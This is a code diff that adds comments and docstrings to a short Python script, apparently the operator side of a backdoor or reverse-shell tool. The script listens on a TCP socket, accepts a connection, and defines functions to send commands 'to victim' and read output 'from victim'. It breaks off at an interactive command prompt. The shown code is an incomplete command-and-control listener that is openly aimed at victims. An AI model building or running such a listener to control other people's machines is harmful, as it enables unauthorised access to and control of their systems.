@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-import socket
-import time
+
+import socket       #It's module for work with socket
+import time         #It's module for work with time
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -11,15 +13,21 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
     conn, addr = server.accept()
     print(f'[+] Connected:{addr}')
 
+
 def send_data(data):
+    '''It's function for send data to victim'''
     data = data.encode()
     conn.send(data)
 
+
 def get_data():
+    '''It's function for get information from victim'''
     data = conn.recv(10240).decode()
     return data
 
+
 def main():
+    '''It's function for call function and work with user'''
     try:
         while True:
             command = str(input('>>>'))
